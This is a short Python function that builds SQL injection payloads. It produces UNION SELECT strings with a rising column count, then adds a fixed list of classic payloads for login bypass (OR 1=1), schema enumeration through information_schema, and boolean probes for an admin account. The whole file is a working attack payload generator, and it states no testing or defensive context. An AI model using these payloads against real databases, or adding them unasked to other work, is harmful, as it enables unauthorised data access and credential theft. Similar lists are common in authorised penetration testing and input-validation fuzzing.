def generate_sql_injection_payloads(fields):
    payloads = []

    for i in range(1, fields + 1):
        payload = "' UNION SELECT " + ", ".join(["'Root'" for _ in range(i)]) + " --"
        payloads.append(payload)
    
    additional_payloads = [
        "' --",
        "' OR 1=1 --",
        "' AND 1=1 --",
        "' OR 'a'='a --",
        "' AND '1'='1 --",
        "' AND '1'='2 --",
        "' UNION SELECT NULL, NULL --",
        "' UNION SELECT 'username', 'password' --",
        "' UNION SELECT user(), database() --",
        "' UNION SELECT table_name FROM information_schema.tables --",
        "' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --",
        "' AND EXISTS (SELECT 1 FROM users WHERE username='admin') --",
        "' AND NOT EXISTS (SELECT 1 FROM users WHERE username='admin') --",
        "' OR 1=1 LIMIT 1 --",
    ]
    
    payloads.extend(additional_payloads)

    return payloads, fields
